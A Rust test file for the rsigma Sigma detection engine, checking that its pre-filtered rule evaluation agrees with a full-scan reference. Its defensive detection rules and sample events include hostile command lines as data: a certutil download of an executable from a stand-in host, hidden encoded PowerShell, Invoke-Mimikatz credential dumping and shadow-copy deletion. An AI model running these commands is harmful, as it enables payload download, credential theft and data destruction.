//! Differential tests: the production `evaluate*` paths against the
//! full-scan reference evaluator.
//!
//! Every pre-filter in the engine (candidate index, cross-rule AC keep-mask,
//! bloom) is only allowed to *over-approximate* the set of rules that could
//! match an event. [`Engine::evaluate_full_scan`] applies no pre-filter at
//! all, so it is authoritative: whenever the two disagree, a pre-filter
//! dropped a rule it had no right to drop.
//!
//! Three tiers of coverage:
//!
//! 1. A hand-written battery ([`WITNESS_BATTERY`]) with one rule per witness
//!    class and per fail-open reason, evaluated against events chosen to sit
//!    on each rule's match boundary.
//! 2. A randomized differential over generated rule/event pairs, which is
//!    where unforeseen modifier and condition interactions surface.
//! 3. `#[ignore]`d corpus differential and candidate-rate checks over a real
//!    rule tree and NDJSON event lanes, driven by
//!    `RSIGMA_DIFF_RULES` / `RSIGMA_DIFF_EVENTS`.

use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

use proptest::prelude::*;
use rsigma_parser::parse_sigma_yaml;
use serde_json::{Value, json};

use crate::Engine;
use crate::event::JsonEvent;
use crate::result::EvaluationResult;

// ---------------------------------------------------------------------------
// Comparison helpers
// ---------------------------------------------------------------------------

/// Order-insensitive fingerprint of a result set.
///
/// Candidate iteration order is not part of the engine's contract, so results
/// are compared as a multiset. Serializing captures the whole result shape
/// (header, matched selections, match detail) rather than just the rule
/// identity, so a pre-filter that changes *what* a rule reports is caught too.
fn fingerprint(results: &[EvaluationResult]) -> Vec<String> {
    let mut out: Vec<String> = results
        .iter()
        .map(|r| serde_json::to_string(r).expect("result serializes"))
        .collect();
    out.sort();
    out
}

/// Assert the indexed path and the full scan agree on `event`.
#[track_caller]
fn assert_agrees(engine: &Engine, event_json: &Value, context: &str) {
    let event = JsonEvent::borrow(event_json);
    let indexed = fingerprint(&engine.evaluate(&event));
    let reference = fingerprint(&engine.evaluate_full_scan(&event));
    assert_eq!(
        indexed, reference,
        "candidate pre-filtering diverged from the full scan ({context})\nevent: {event_json}"
    );
}

/// Assert agreement with every pre-filter combination the engine exposes,
/// so a rule set is checked against the index alone, the bloom, the
/// cross-rule AC, and their composition.
#[track_caller]
fn assert_agrees_all_prefilters(yaml: &str, events: &[Value], context: &str) {
    let collection = match parse_sigma_yaml(yaml) {
        Ok(c) => c,
        Err(e) => panic!("battery rule failed to parse ({context}): {e}"),
    };

    // (bloom, cross-rule AC)
    for (bloom, ac) in [(false, false), (true, false), (false, true), (true, true)] {
        let mut engine = Engine::new();
        engine.set_bloom_prefilter(bloom);
        #[cfg(feature = "daachorse-index")]
        engine.set_cross_rule_ac(ac);
        #[cfg(not(feature = "daachorse-index"))]
        let _ = ac;
        if let Err(e) = engine.add_collection(&collection) {
            panic!("battery rule failed to compile ({context}): {e}");
        }
        for event in events {
            assert_agrees(
                &engine,
                event,
                &format!("{context}, bloom={bloom}, cross_rule_ac={ac}"),
            );
        }
    }
}

// ---------------------------------------------------------------------------
// Tier 1: witness-class and fail-open battery
// ---------------------------------------------------------------------------

/// One entry per witness class the candidate index can extract, and per
/// reason a rule must stay fail-open. `(name, rule yaml)`.
const WITNESS_BATTERY: &[(&str, &str)] = &[
    (
        "exact-field",
        r#"
title: Exact
logsource:
    product: windows
detection:
    selection:
        Image: 'C:\Windows\System32\cmd.exe'
    condition: selection
"#,
    ),
    (
        "contains",
        r#"
title: Contains
detection:
    selection:
        CommandLine|contains: 'whoami'
    condition: selection
"#,
    ),
    (
        "startswith-endswith",
        r#"
title: Anchored
detection:
    selection:
        Image|startswith: 'C:\Users'
        Image|endswith: '.exe'
    condition: selection
"#,
    ),
    (
        "contains-all",
        r#"
title: ContainsAll
detection:
    selection:
        CommandLine|contains|all:
            - '-enc'
            - 'hidden'
    condition: selection
"#,
    ),
    (
        "many-contains-collapses-to-aho-corasick",
        r#"
title: ManyContains
detection:
    selection:
        CommandLine|contains:
            - 'alpha'
            - 'bravo'
            - 'charlie'
            - 'delta'
            - 'echo'
            - 'foxtrot'
            - 'golf'
            - 'hotel'
            - 'india'
            - 'juliet'
    condition: selection
"#,
    ),
    (
        "keywords",
        r#"
title: Keywords
detection:
    keywords:
        - 'vssadmin delete shadows'
        - 'mimikatz'
    condition: keywords
"#,
    ),
    (
        "wildcard-literal",
        r#"
title: Wildcard
detection:
    selection:
        CommandLine: '*sekurlsa*logonpasswords*'
    condition: selection
"#,
    ),
    (
        "regex-mandatory-literal",
        r#"
title: RegexLiteral
detection:
    selection:
        CommandLine|re: 'certutil.*(urlcache|verifyctl)'
    condition: selection
"#,
    ),
    (
        "regex-opaque-fail-open",
        r#"
title: RegexOpaque
detection:
    selection:
        CommandLine|re: '^.{200,}$'
    condition: selection
"#,
    ),
    (
        "base64-encoded",
        r#"
title: Base64
detection:
    selection:
        CommandLine|base64offset|contains: 'IEX (New-Object'
    condition: selection
"#,
    ),
    (
        "windash",
        r#"
title: Windash
detection:
    selection:
        CommandLine|windash|contains: '-NoProfile'
    condition: selection
"#,
    ),
    (
        "numeric-eq-presence-only",
        r#"
title: NumericEq
detection:
    selection:
        EventID: 4688
    condition: selection
"#,
    ),
    (
        "numeric-range-presence-only",
        r#"
title: NumericRange
detection:
    selection:
        EventID|gte: 4000
    condition: selection
"#,
    ),
    (
        "cidr-presence-only",
        r#"
title: Cidr
detection:
    selection:
        DestinationIp|cidr: '10.0.0.0/8'
    condition: selection
"#,
    ),
    (
        "exists-true-presence",
        r#"
title: ExistsTrue
detection:
    selection:
        TargetFilename|exists: true
    condition: selection
"#,
    ),
    (
        "exists-false-fail-open",
        r#"
title: ExistsFalse
detection:
    selection:
        TargetFilename|exists: false
    condition: selection
"#,
    ),
    (
        "null-fail-open",
        r#"
title: NullMatch
detection:
    selection:
        User: null
    condition: selection
"#,
    ),
    (
        "condition-negation-fail-open",
        r#"
title: AndNot
detection:
    selection:
        Image|endswith: '\cmd.exe'
    filter:
        User: 'NT AUTHORITY\SYSTEM'
    condition: selection and not filter
"#,
    ),
    (
        "or-with-negated-branch-fail-open",
        r#"
title: OrNot
detection:
    selection:
        Image|endswith: '\cmd.exe'
    filter:
        User: 'SYSTEM'
    condition: selection or not filter
"#,
    ),
    (
        "matcher-negation-fail-open",
        r#"
title: FieldNeq
detection:
    selection:
        Image|endswith: '\cmd.exe'
        User|contains|all:
            - 'CORP'
            - 'alice'
    filter:
        IntegrityLevel|contains: 'Medium'
    condition: selection and not filter
"#,
    ),
    (
        "one-of-selector",
        r#"
title: OneOf
detection:
    selection_a:
        Image|endswith: '\powershell.exe'
    selection_b:
        Image|endswith: '\pwsh.exe'
    condition: 1 of selection_*
"#,
    ),
    (
        "all-of-selector",
        r#"
title: AllOf
detection:
    selection_img:
        Image|endswith: '\rundll32.exe'
    selection_cmd:
        CommandLine|contains: 'javascript:'
    condition: all of selection_*
"#,
    ),
    (
        "anyof-list-of-maps",
        r#"
title: AnyOfMaps
detection:
    selection:
        - Image|endswith: '\wmic.exe'
        - CommandLine|contains: 'process call create'
    condition: selection
"#,
    ),
    (
        "mixed-exact-and-contains",
        r#"
title: MixedExactContains
detection:
    selection:
        EventID: '1'
        CommandLine|contains: 'Invoke-Mimikatz'
    condition: selection
"#,
    ),
    (
        "fieldref-fail-open",
        r#"
title: FieldRef
detection:
    selection:
        Image|fieldref: 'ParentImage'
    condition: selection
"#,
    ),
    (
        "nested-field-path",
        r#"
title: NestedPath
detection:
    selection:
        process.executable|endswith: '\curl.exe'
    condition: selection
"#,
    ),
    (
        "cased-modifier",
        r#"
title: Cased
detection:
    selection:
        CommandLine|contains|cased: 'PowerShell'
    condition: selection
"#,
    ),
    (
        "all-uppercase-cased-modifier",
        r#"
title: AllUppercaseCased
detection:
    selection:
        CommandLine|contains|cased: 'CMD.EXE'
    condition: selection
"#,
    ),
    (
        "unicode-values",
        r#"
title: Unicode
detection:
    selection:
        User|contains: 'Ärzte'
        CommandLine|contains: 'ΣΊΓΜΑ'
    condition: selection
"#,
    ),
];

/// Events that probe the battery's match boundaries: exact hits, case
/// variants, near-misses, absent fields, arrays, nested objects, numbers as
/// strings and strings as numbers, and empty events.
fn battery_events() -> Vec<Value> {
    vec![
        json!({}),
        json!({"Image": r"C:\Windows\System32\cmd.exe", "product": "windows"}),
        json!({"Image": r"c:\windows\system32\CMD.EXE", "product": "windows"}),
        json!({"Image": r"C:\Windows\System32\cmd.exe.bak"}),
        json!({"CommandLine": "cmd /c whoami /priv"}),
        json!({"CommandLine": "WHOAMI"}),
        json!({"CommandLine": "powershell -nop -w hidden -enc SQBFAFgA"}),
        json!({"CommandLine": "powershell -NoProfile", "Image": r"C:\pwsh.exe"}),
        json!({"CommandLine": "powershell \u{2013}NoProfile"}),
        json!({"CommandLine": "IEX (New-Object Net.WebClient)"}),
        json!({"CommandLine": "SUVYIChOZXctT2JqZWN0"}),
        json!({"CommandLine": "certutil -urlcache -split -f http://h/p.exe"}),
        json!({"CommandLine": "sekurlsa::logonpasswords"}),
        json!({"CommandLine": "delta echo foxtrot"}),
        json!({"CommandLine": "nothing interesting here"}),
        json!({"CommandLine": "PowerShell.exe -Command x"}),
        json!({"CommandLine": "powershell.exe -command x"}),
        json!({"CommandLine": "CMD.EXE"}),
        json!({"EventID": 4688}),
        json!({"EventID": "4688"}),
        json!({"EventID": 1}),
        json!({"EventID": "1", "CommandLine": "Invoke-Mimikatz -DumpCreds"}),
        json!({"EventID": 4688.0}),
        json!({"DestinationIp": "10.1.2.3"}),
        json!({"DestinationIp": "192.0.2.1"}),
        json!({"TargetFilename": r"C:\Users\u\Downloads\a.pdf.exe"}),
        json!({"User": null}),
        json!({"User": r"NT AUTHORITY\SYSTEM", "Image": r"C:\Windows\System32\cmd.exe"}),
        json!({"User": r"CORP\alice", "Image": r"C:\Windows\System32\cmd.exe", "IntegrityLevel": "High"}),
        json!({"User": r"CORP\alice", "Image": r"C:\Windows\System32\cmd.exe", "IntegrityLevel": "Medium"}),
        json!({"User": "Ärzte", "CommandLine": "ΣΊΓΜΑ"}),
        json!({"User": "ärzte", "CommandLine": "σίγμα"}),
        json!({"User": "ÄRZTE", "CommandLine": "ΣΊΓΜΑ ΤΕΛΟΣ"}),
        json!({"Image": [r"C:\a\wmic.exe", r"C:\b\cmd.exe"]}),
        json!({"CommandLine": ["process call create", "benign"]}),
        json!({"process": {"executable": r"C:\Program Files\curl.exe"}}),
        json!({"Image": r"C:\x\rundll32.exe", "CommandLine": "javascript:alert(1)"}),
        json!({"Image": r"C:\x\rundll32.exe", "CommandLine": "benign"}),
        json!({"Image": r"C:\Users\bob\evil.exe"}),
        json!({"Image": r"C:\Users\bob\evil.dll"}),
        json!({"ParentImage": r"C:\a.exe", "Image": r"C:\a.exe"}),
        json!({"mimikatz": "in a field name value", "other": "vssadmin delete shadows /all"}),
        json!({"nested": {"deep": {"text": "mimikatz"}}}),
        json!({"CommandLine": 42, "EventID": true}),
        json!({"product": "linux", "Image": r"C:\Windows\System32\cmd.exe"}),
    ]
}

#[test]
fn witness_battery_rules_agree_individually() {
    let events = battery_events();
    for (name, yaml) in WITNESS_BATTERY {
        assert_agrees_all_prefilters(yaml, &events, name);
    }
}

#[test]
fn witness_battery_agrees_as_one_rule_set() {
    // Loading every battery rule into one engine is the interesting case for
    // cross-rule structures: one rule's needles must never mask another's.
    let mut yaml = String::new();
    for (i, (_, rule)) in WITNESS_BATTERY.iter().enumerate() {
        if i > 0 {
            yaml.push_str("\n---\n");
        }
        yaml.push_str(rule);
    }
    assert_agrees_all_prefilters(&yaml, &battery_events(), "whole battery");
}

#[test]
fn logsource_paths_agree_with_full_scan() {
    let yaml = r#"
title: Windows Product
logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\cmd.exe'
    condition: selection
---
title: Linux Product
logsource:
    product: linux
detection:
    selection:
        exe|contains: 'bash'
    condition: selection
---
title: Product Less
detection:
    keywords:
        - 'cmd.exe'
    condition: keywords
"#;
    let collection = parse_sigma_yaml(yaml).unwrap();
    let mut engine = Engine::new();
    engine.add_collection(&collection).unwrap();

    let events = vec![
        json!({"Image": r"C:\cmd.exe", "product": "windows", "category": "process_creation"}),
        json!({"Image": r"C:\cmd.exe", "product": "linux"}),
        json!({"exe": "/usr/bin/bash", "product": "linux"}),
        json!({"Image": r"C:\cmd.exe"}),
    ];

    for event_json in &events {
        let event = JsonEvent::borrow(event_json);
        for ls in [
            rsigma_parser::LogSource {
                product: Some("windows".into()),
                category: Some("process_creation".into()),
                ..Default::default()
            },
            rsigma_parser::LogSource {
                product: Some("linux".into()),
                ..Default::default()
            },
            rsigma_parser::LogSource::default(),
        ] {
            assert_eq!(
                fingerprint(&engine.evaluate_pruned(&event, &ls)),
                fingerprint(&engine.evaluate_pruned_full_scan(&event, &ls)),
                "evaluate_pruned diverged for {event_json} with {ls:?}"
            );
            assert_eq!(
                fingerprint(&engine.evaluate_with_logsource(&event, &ls)),
                fingerprint(&engine.evaluate_with_logsource_full_scan(&event, &ls)),
                "evaluate_with_logsource diverged for {event_json} with {ls:?}"
            );
        }
    }
}

// ---------------------------------------------------------------------------
// Tier 2: randomized differential
// ---------------------------------------------------------------------------

/// Field names the generator draws from. A deliberately small pool so
/// generated rules and generated events collide often; a large pool would
/// mostly produce rules that trivially cannot match.
const GEN_FIELDS: &[&str] = &["Image", "CommandLine", "User", "EventID", "TargetFilename"];

/// Modifier suffixes, including the ones that must stay fail-open.
const GEN_MODIFIERS: &[&str] = &[
    "",
    "|contains",
    "|startswith",
    "|endswith",
    "|cased",
    "|contains|all",
    "|contains|cased",
    "|re",
    "|base64offset|contains",
    "|windash|contains",
    "|exists",
    "|gte",
];

/// Values shared between rules and events so matches actually happen.
const GEN_VALUES: &[&str] = &[
    "cmd.exe",
    "CMD.EXE",
    r"C:\Windows\cmd.exe",
    "whoami",
    "-enc",
    "42",
    "true",
    "*evil*",
    "a.b",
    "Ärzte",
    "σ",
];

const GEN_CONDITIONS: &[&str] = &[
    "sel_a",
    "sel_a and sel_b",
    "sel_a or sel_b",
    "sel_a and not sel_b",
    "sel_a or not sel_b",
    "not sel_a",
    "1 of sel_*",
    "all of sel_*",
    "sel_a and (sel_b or not sel_c)",
];

/// A generated detection item: `field|modifier: value`.
#[derive(Debug, Clone)]
struct GenItem {
    field: &'static str,
    modifier: &'static str,
    value: &'static str,
}

fn gen_item() -> impl Strategy<Value = GenItem> {
    (
        prop::sample::select(GEN_FIELDS),
        prop::sample::select(GEN_MODIFIERS),
        prop::sample::select(GEN_VALUES),
    )
        .prop_map(|(field, modifier, value)| GenItem {
            field,
            modifier,
            value,
        })
}

/// Render one generated rule. `exists`/`gte` need typed scalars rather than
/// quoted strings, and `|contains|all` needs a list, so those are special
/// cased; everything else is a single quoted value.
fn render_selection(name: &str, items: &[GenItem]) -> String {
    let mut out = format!("    {name}:\n");
    for item in items {
        let GenItem {
            field,
            modifier,
            value,
        } = item;
        match *modifier {
            "|exists" => out.push_str(&format!("        {field}|exists: true\n")),
            "|gte" => {
                // Non-numeric values would fail to compile under |gte.
                let n = value.parse::<i64>().unwrap_or(1);
                out.push_str(&format!("        {field}|gte: {n}\n"));
            }
            "|contains|all" => {
                // `|all` requires more than one value.
                out.push_str(&format!("        {field}|contains|all:\n"));
                out.push_str(&format!("            - '{}'\n", escape(value)));
                out.push_str("            - 'e'\n");
            }
            "|re" => {
                // Keep generated regexes valid: escape the value and wrap it.
                out.push_str(&format!(
                    "        {field}|re: '{}.*'\n",
                    escape(&regex_escape(value))
                ));
            }
            m => out.push_str(&format!("        {field}{m}: '{}'\n", escape(value))),
        }
    }
    out
}

fn escape(s: &str) -> String {
    s.replace('\'', "''")
}

fn regex_escape(s: &str) -> String {
    let mut out = String::new();
    for c in s.chars() {
        if "\\.[]{}()*+?^$|".contains(c) {
            out.push('\\');
        }
        out.push(c);
    }
    out
}

fn gen_rule() -> impl Strategy<Value = String> {
    (
        prop::collection::vec(gen_item(), 1..=2),
        prop::collection::vec(gen_item(), 1..=2),
        prop::collection::vec(gen_item(), 1..=2),
        prop::sample::select(GEN_CONDITIONS),
        prop::option::of(prop::sample::select(&["windows", "linux"][..])),
    )
        .prop_map(|(a, b, c, condition, product)| {
            let mut yaml = String::from("title: Generated\n");
            if let Some(p) = product {
                yaml.push_str(&format!("logsource:\n    product: {p}\n"));
            }
            yaml.push_str("detection:\n");
            yaml.push_str(&render_selection("sel_a", &a));
            yaml.push_str(&render_selection("sel_b", &b));
            yaml.push_str(&render_selection("sel_c", &c));
            yaml.push_str(&format!("    condition: {condition}\n"));
            yaml
        })
}

/// Generated events: a subset of the pooled fields, with scalars, arrays,
/// numbers, bools, and nulls so type coercion paths are exercised.
fn gen_event() -> impl Strategy<Value = Value> {
    prop::collection::vec(
        (
            prop::sample::select(GEN_FIELDS),
            prop_oneof![
                prop::sample::select(GEN_VALUES).prop_map(|v| json!(v)),
                Just(json!(42)),
                Just(json!(4688)),
                Just(json!(true)),
                Just(json!(null)),
                Just(json!([r"C:\Windows\cmd.exe", "whoami"])),
                Just(json!("prefix cmd.exe suffix")),
                Just(json!("ÄRZTE and ΣΊΓΜΑ")),
            ],
        ),
        0..=4,
    )
    .prop_map(|pairs| {
        let mut map = BTreeMap::new();
        for (field, value) in pairs {
            map.insert(field.to_string(), value);
        }
        Value::Object(map.into_iter().collect())
    })
}

proptest! {
    #![proptest_config(ProptestConfig::with_cases(512))]

    /// A generated rule must produce identical results through the indexed
    /// path and the full scan, for every generated event.
    #[test]
    fn generated_rules_agree_with_full_scan(
        yaml in gen_rule(),
        event_json in gen_event(),
    ) {
        // Generated combinations can be semantically invalid (e.g. a
        // modifier that rejects its value); those are not interesting here.
        let Ok(collection) = parse_sigma_yaml(&yaml) else { return Ok(()); };
        let mut engine = Engine::new();
        if engine.add_collection(&collection).is_err() {
            return Ok(());
        }
        let event = JsonEvent::borrow(&event_json);
        prop_assert_eq!(
            fingerprint(&engine.evaluate(&event)),
            fingerprint(&engine.evaluate_full_scan(&event)),
            "diverged\nrule:\n{}\nevent: {}",
            yaml,
            event_json
        );
    }

    /// The same, with several generated rules resident at once and both
    /// substring pre-filters on, so cross-rule structures are covered.
    #[test]
    fn generated_rule_sets_agree_with_full_scan(
        rules in prop::collection::vec(gen_rule(), 2..=6),
        event_json in gen_event(),
    ) {
        let mut engine = Engine::new();
        engine.set_bloom_prefilter(true);
        #[cfg(feature = "daachorse-index")]
        engine.set_cross_rule_ac(true);

        let mut loaded = 0;
        for yaml in &rules {
            if let Ok(collection) = parse_sigma_yaml(yaml)
                && engine.add_collection(&collection).is_ok()
            {
                loaded += 1;
            }
        }
        if loaded == 0 {
            return Ok(());
        }

        let event = JsonEvent::borrow(&event_json);
        prop_assert_eq!(
            fingerprint(&engine.evaluate(&event)),
            fingerprint(&engine.evaluate_full_scan(&event)),
            "diverged\nrules:\n{}\nevent: {}",
            rules.join("\n---\n"),
            event_json
        );
    }
}

// ---------------------------------------------------------------------------
// Tier 3: corpus differential (opt-in)
// ---------------------------------------------------------------------------

fn collect_rule_files(dir: &Path, out: &mut Vec<PathBuf>) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_dir() {
            collect_rule_files(&path, out);
        } else if path.extension().is_some_and(|e| e == "yml" || e == "yaml") {
            out.push(path);
        }
    }
}

fn load_corpus(rules_dir: &str) -> (Engine, usize) {
    let mut files = Vec::new();
    collect_rule_files(Path::new(rules_dir), &mut files);
    files.sort();
    assert!(!files.is_empty(), "no rule files under {rules_dir}");

    let mut rules = Vec::new();
    let mut loaded = 0usize;
    for path in &files {
        let Ok(text) = std::fs::read_to_string(path) else {
            continue;
        };
        if let Ok(collection) = parse_sigma_yaml(&text) {
            loaded += 1;
            rules.extend(collection.rules);
        }
    }
    assert!(loaded > 0, "no rules compiled from {rules_dir}");
    let mut engine = Engine::new();
    let errors = engine.add_rules(&rules);
    assert!(
        !engine.rules.is_empty(),
        "no rules compiled from {rules_dir}"
    );
    eprintln!(
        "corpus load: {} rules compiled, {} compile errors",
        engine.rules.len(),
        errors.len()
    );
    (engine, loaded)
}

/// Full-corpus differential over a real rule tree and NDJSON event lanes.
///
/// Ignored by default because it needs a materialized corpus. Run it with:
///
/// ```text
/// RSIGMA_DIFF_RULES=target/perf-fixtures/sigma/rules \
/// RSIGMA_DIFF_EVENTS=target/perf-fixtures/events \
///   cargo test -p rsigma-eval --all-features corpus_differential -- --ignored --nocapture
/// ```
///
/// `RSIGMA_DIFF_EVENT_LIMIT` caps events per lane (default 2000).
#[test]
#[ignore = "requires RSIGMA_DIFF_RULES and RSIGMA_DIFF_EVENTS"]
fn corpus_differential_agrees_with_full_scan() {
    let rules_dir = std::env::var("RSIGMA_DIFF_RULES")
        .expect("set RSIGMA_DIFF_RULES to a directory of Sigma rules");
    let events_dir = std::env::var("RSIGMA_DIFF_EVENTS")
        .expect("set RSIGMA_DIFF_EVENTS to a directory of .ndjson lanes");
    let limit: usize = std::env::var("RSIGMA_DIFF_EVENT_LIMIT")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(2000);

    let (engine, loaded) = load_corpus(&rules_dir);
    eprintln!("corpus differential: {loaded} rule files loaded");

    let mut lanes: Vec<PathBuf> = std::fs::read_dir(&events_dir)
        .expect("readable events dir")
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.extension().is_some_and(|e| e == "ndjson"))
        .collect();
    lanes.sort();
    assert!(!lanes.is_empty(), "no .ndjson lanes under {events_dir}");

    let mut checked = 0usize;
    for lane in &lanes {
        let text = std::fs::read_to_string(lane).expect("readable lane");
        for line in text.lines().take(limit) {
            let Ok(event_json) = serde_json::from_str::<Value>(line) else {
                continue;
            };
            let event = JsonEvent::borrow(&event_json);
            let indexed = fingerprint(&engine.evaluate(&event));
            let reference = fingerprint(&engine.evaluate_full_scan(&event));
            assert_eq!(
                indexed,
                reference,
                "candidate pre-filtering diverged on {}\nevent: {}",
                lane.display(),
                event_json
            );
            checked += 1;
        }
        eprintln!("corpus differential: {} ok", lane.display());
    }
    eprintln!("corpus differential: {checked} events agreed across {loaded} rule files");
}

/// Measure the real candidate index over materialized corpus lanes.
///
/// This is separate from [`corpus_differential_agrees_with_full_scan`] so the
/// rate check does not pay for a full scan of every event. The p95 threshold is
/// the performance criterion the witness audit estimated before the production
/// index existed.
#[test]
#[ignore = "requires RSIGMA_DIFF_RULES and RSIGMA_DIFF_EVENTS"]
fn corpus_candidate_rate_stays_below_ten_percent() {
    let rules_dir = std::env::var("RSIGMA_DIFF_RULES")
        .expect("set RSIGMA_DIFF_RULES to a directory of Sigma rules");
    let events_dir = std::env::var("RSIGMA_DIFF_EVENTS")
        .expect("set RSIGMA_DIFF_EVENTS to a directory of .ndjson lanes");
    let limit: usize = std::env::var("RSIGMA_DIFF_EVENT_LIMIT")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(2000);
    let (engine, loaded) = load_corpus(&rules_dir);
    let rule_count = engine.rules.len();
    assert!(rule_count > 0, "no compiled rules from {rules_dir}");

    let mut lanes: Vec<PathBuf> = std::fs::read_dir(&events_dir)
        .expect("readable events dir")
        .flatten()
        .map(|entry| entry.path())
        .filter(|path| {
            path.extension()
                .is_some_and(|extension| extension == "ndjson")
        })
        .collect();
    lanes.sort();
    assert!(!lanes.is_empty(), "no .ndjson lanes under {events_dir}");

    for lane in &lanes {
        let text = std::fs::read_to_string(lane).expect("readable lane");
        let mut candidate_counts = Vec::new();
        for line in text.lines().take(limit) {
            let Ok(event_json) = serde_json::from_str::<Value>(line) else {
                continue;
            };
            let event = JsonEvent::borrow(&event_json);
            candidate_counts.push(engine.rule_index.candidates(&event).len());
        }
        assert!(
            !candidate_counts.is_empty(),
            "no valid events in {}",
            lane.display()
        );
        candidate_counts.sort_unstable();
        let p95_index = (candidate_counts.len() * 95).div_ceil(100) - 1;
        let p95_count = candidate_counts[p95_index];
        let p95_rate = p95_count as f64 * 100.0 / rule_count as f64;
        eprintln!(
            "candidate_rate lane={} events={} rules={} p95_count={} p95_percent={:.2}",
            lane.file_stem()
                .and_then(|name| name.to_str())
                .unwrap_or("?"),
            candidate_counts.len(),
            rule_count,
            p95_count,
            p95_rate
        );
        assert!(
            p95_rate < 10.0,
            "candidate p95 for {} is {p95_rate:.2}% ({p95_count}/{rule_count})",
            lane.display()
        );
    }
    eprintln!("candidate rate: {loaded} rule files loaded");
}
